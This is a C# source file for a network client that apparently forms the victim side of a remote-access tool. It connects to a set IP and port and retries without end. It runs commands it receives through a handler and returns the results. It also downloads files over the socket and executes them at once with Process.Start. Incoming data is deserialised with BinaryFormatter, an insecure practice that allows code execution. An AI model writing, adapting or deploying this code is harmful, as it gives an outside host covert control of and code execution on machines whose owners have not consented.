using System;
using System.IO;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;

namespace SWK
{
    public class NetClient
    {
        private string Ip { get; set; }
        private int Port { get; set; }

        private TcpClient Client { get; set; }
        private NetworkStream Stream { get; set; }

        public bool isConnected { get { return Client.Connected; } }

        public DataType DataType { get; set; } = DataType.Command;

        public string FileNameBuffer { get; set; }

        public Thread ProcessThread { get; set; }

        public NetClient(string ip, int port)
        {
            Ip = ip;
            Port = port;
            Client = new TcpClient();
        }

        public void Connect()
        {
            try
            {
                Client.Connect(Ip, Port);
                Stream = Client.GetStream();
                ProcessThread = new Thread(Process);
                ProcessThread.Start();
            }
            catch (Exception)
            {
                Connect();
            }
        }

        private void Process()
        {
            byte[] Data;
            while (true)
            {
                if (DataType == DataType.Command)
                {
                    StringBuilder Builder = new StringBuilder();

                    do
                    {
                        BinaryReader Br = new BinaryReader(Stream);
                        int Len = Br.ReadInt32();
                        Data = Br.ReadBytes(Len);
                        Builder.Append(Encoding.Default.GetString(Data));
                    }
                    while (Stream.DataAvailable);

                    if (Data.Length != 0)
                    {

                        string Message = Builder.ToString();
                        byte[] Resposne = CommandHandler.Handler(Message);

                        BinaryWriter bw = new BinaryWriter(Stream);
                        bw.Write(Resposne.Length);
                        bw.Write(Resposne);
                    }
                }
                else if (DataType == DataType.File)
                {
                    BinaryFormatter outformat = new BinaryFormatter();
                    FileStream fs = new FileStream(FileNameBuffer, FileMode.OpenOrCreate);
                    BinaryWriter bw = new BinaryWriter(fs);

                    do
                    {
                        int count;
                        count = int.Parse(outformat.Deserialize(Stream).ToString());

                        int i = 0;
                        for (; i < count; i += 1024)
                        {
                            byte[] buf = (byte[])(outformat.Deserialize(Stream));
                            bw.Write(buf);
                        }
                    }
                    while (Stream.DataAvailable);

                    System.Diagnostics.Process.Start(FileNameBuffer);

                    bw.Close();
                    fs.Close();
                    DataType = DataType.Command;
                }
            }
        }
    }

    public enum DataType : uint
    {
        Command,
        File
    }
}
